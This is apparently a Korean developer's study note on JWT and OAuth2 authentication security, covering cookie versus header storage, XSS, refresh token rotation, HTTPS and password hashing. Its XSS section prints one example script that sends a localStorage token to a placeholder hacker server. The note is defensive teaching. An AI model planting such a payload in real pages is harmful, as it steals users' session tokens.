프로젝트에서 JWT + OAuth2 인증을 구현하면서 관련 보안 개념을 정리했다

---

### JWT 저장 방식

**HttpOnly 쿠키**
- 브라우저가 자동으로 매 요청마다 전송
- JS에서 `document.cookie`로 접근 불가 → XSS 방어
- 웹 서비스에 적합

**Authorization 헤더 (Bearer)**
- `Authorization: Bearer {token}` 형태로 직접 첨부
- 모바일 앱, 서버 간 통신처럼 브라우저 없는 환경에 적합
- localStorage에 저장 시 XSS에 취약

---

### XSS (Cross-Site Scripting)

공격자가 악성 스크립트를 피해자 브라우저에서 실행시키는 공격

```html
<!-- 게시판에 이런 내용이 삽입되면 -->
<script>fetch('https://해커서버.com?token='+localStorage.getItem('token'))</script>
```

피해자가 해당 게시글을 열면 토큰이 해커 서버로 전송된다

HttpOnly 쿠키는 JS 접근 자체가 차단되어 스크립트가 실행돼도 토큰을 가져갈 수 없다

모바일 네이티브 앱은 HTML을 직접 렌더링하는 구조가 아니라 XSS 위협이 거의 없다
단, WebView를 사용하는 앱은 브라우저와 유사한 구조라 주의가 필요하다

---

### HttpOnly는 어떻게 JS 접근을 막나

`HttpOnly`는 쿠키에 붙이는 속성이고, 이걸 보면 **브라우저가** JS의 쿠키 접근 경로에서 그 쿠키를 빼버린다. 서버가 아니라 브라우저가 강제한다

서버가 `Set-Cookie` 헤더에 플래그를 붙여 내려보낸다

```
Set-Cookie: access_token=eyJ...; HttpOnly; Secure; SameSite=Lax; Path=/
```

이후 브라우저는

- `document.cookie`로 읽으면 → HttpOnly 쿠키는 목록에서 제외
- HTTP 요청을 보낼 땐 → 알아서 헤더에 실어 보냄

즉 "HttpOnly" = HTTP 통신엔 쓰이지만 스크립트에선 못 쓴다. 그래서 XSS로 스크립트가 실행돼도 토큰을 가져갈 수 없다

저장 자체는 일반 쿠키와 똑같이 된다 (개발자도구 Application 탭엔 보임). JS에서만 안 보일 뿐이다

---

### 그럼 결국 못 막는 거 아닌가 — 위협 모델

HttpOnly는 만능이 아니다. 쿠키는 결국 어딘가에 저장되니 접근 경로가 더 있다

| 경로 | 조건 | HttpOnly도 보임? |
|---|---|---|
| 개발자도구 | 로컬 접근 | O |
| 쿠키 DB 파일 직접 읽기 | 기기 파일 접근(멀웨어) | O |
| 브라우저 확장프로그램 | cookies 권한 | O |
| 네트워크 도청 | HTTP 평문(HTTPS면 차단) | O |
| `document.cookie` (페이지 JS) | 사이트에 JS 실행 | **X ← HttpOnly가 막는 곳** |

차이는 **"원격에서 대량으로 가능하냐"**다

- **XSS**는 게시판에 스크립트 한 줄 심으면 그 글 본 모든 사용자가 털린다. 공격자가 피해자를 만난 적도 없이, 원격에서, 대량으로. → HttpOnly가 정확히 이걸 막는다
- **나머지 경로**(디스크/확장/네트워크/도구)는 기기나 네트워크를 이미 장악했거나 사용자가 악성 확장을 직접 깐 경우다. 그 정도면 키로거로 비밀번호를 직접 털 수 있어서 토큰 방어는 의미가 없다 — 앱이 책임질 범위 밖이다

그래서 웹 앱이 막아야 할 선은 명확해진다

| 위협 | 대비 | 주체 |
|---|---|---|
| XSS | HttpOnly | 웹 앱 |
| CSRF | SameSite | 웹 앱 |
| 네트워크 도청 | HTTPS | 웹 앱/인프라 |
| 기기 장악 | (앱 범위 밖) | OS/사용자 |

HttpOnly는 그중 원격 대량 공격(XSS) 하나를 막는 가성비 좋은 방어다. 완벽히 못 막는 대신 짧은 exp + 로테이션으로 "털려도 피해 최소화"를 더한다 (defense in depth)

### JWT 토큰 구조

**Access Token**

| Claim | 설명 |
|---|---|
| `sub` | 사용자 식별자 (이메일 등) |
| `iat` | 발급 시간 |
| `exp` | 만료 시간 |
| `role` | 권한 |

**Refresh Token**

| Claim | 설명 |
|---|---|
| `sub` | 사용자 식별자 |
| `iat` | 발급 시간 |
| `exp` | 만료 시간 |

Refresh Token은 Access Token 재발급 용도만 있어서 role이 필요 없다

JWT는 Base64 인코딩이라 누구나 디코딩 가능하므로 민감한 정보는 담으면 안 된다
(서명은 위변조 방지용이지 내용을 숨기는 게 아님)

---

### 토큰 만료(exp) vs 쿠키 저장 기간(maxAge)

헷갈리기 쉬운데, 토큰의 만료와 쿠키의 보관 기간은 **완전히 별개**다

- **JWT exp** — 토큰 내부에 박힌 만료 시각. 서버가 디코딩해서 검사한다. 한번 서명되면 못 바꾼다. **보안의 실제 기준** (탈취돼도 이 시간만 유효)
- **쿠키 maxAge** — 브라우저가 그 토큰 문자열을 며칠 보관할지. 보안과 무관한 저장 기간

| | 무엇 | 설정 위치 |
|---|---|---|
| JWT exp | 서버가 인정하는 유효 시간 | 토큰 생성 시 (`jwt.expiration`) |
| 쿠키 maxAge | 브라우저 보관 기간 | 쿠키 생성 시 (`ResponseCookie.maxAge`) |

둘은 다른 곳에서 따로 정하니 값이 같을 필요가 없다

예를 들어 maxAge를 exp보다 길게 두면, 쿠키엔 "만료된 토큰 문자열"이 남고 서버는 그걸 401로 거부한다 — 토큰은 죽었지만 쿠키 그릇은 살아있는 상태다

결국 로테이션도 "그릇(쿠키)에 든 토큰만 새것으로 갈아끼우는 것"이다. **만료를 결정하는 건 토큰(exp), 쿠키는 운반·보관 담당**이다

### 인증 흐름

```
로그인 → Access Token + Refresh Token 발급
↓
API 요청마다 Access Token으로 인증 (만료될 때까지 계속 사용)
↓
Access Token 만료
↓
Refresh Token으로 Access Token 재발급
↓
Refresh Token 만료 → 재로그인
```

---

### Refresh Token Rotation

Access Token 재발급 시 Refresh Token도 함께 새로 발급하는 방식

```
정상 사용자: Refresh Token B로 요청 → 성공
해커: 탈취한 Refresh Token A로 요청 → 이미 폐기된 토큰 → 감지
→ 해당 계정 모든 토큰 강제 폐기 + 재로그인 요구
```

활발하게 사용하는 동안은 Refresh Token이 계속 갱신되어 로그인이 유지되고
오랫동안 사용하지 않으면 만료되어 재로그인하는 구조다

프로젝트에도 적용되어 있다

```java
// Refresh Token Rotation
String newRefreshToken = jwtTokenProvider.createRefreshToken(subject);
savedToken.updateToken(newRefreshToken);
```

### HTTPS와 암호화

HTTPS(TLS)는 Body, Header, URL 전체를 암호화한다

중간에서 가로채도 클라이언트와 서버만 키를 가지고 있어 복호화가 불가능하다

**Perfect Forward Secrecy (PFS)**

과거엔 서버 개인키 하나로 모든 세션을 암호화했는데 키가 털리면 과거 트래픽까지 복호화가 가능했다

PFS는 세션마다 임시 키를 새로 생성하고 사용 후 폐기해서 서버 개인키가 털려도 과거 트래픽은 복호화할 수 없다

TLS 1.3부터 기본 적용되어 있다

---

### 비밀번호 암호화

**단방향 해시 (BCrypt)**
- 복호화 불가
- 로그인 시 입력값을 동일하게 해싱해서 비교
- Salt 자동 포함으로 레인보우 테이블 공격 방어
- Cost Factor로 강도 조절 가능 (하드웨어 발전에 대응)
- 비밀번호 원본은 서버도 모름 → 비밀번호 찾기가 재설정 방식인 이유

**양방향 암호화 (AES)**
- 복호화 가능
- 주민번호, 카드번호처럼 나중에 원본이 필요한 정보에 사용

---

### 정리

- 웹 서비스 → HttpOnly 쿠키, 앱/서버 간 통신 → Bearer 헤더
- JWT에 민감한 정보 담지 않기
- Access Token은 짧게, Refresh Token은 길게
- Refresh Token Rotation으로 탈취 감지 가능
- HTTPS 필수, 비밀번호는 BCrypt 해싱
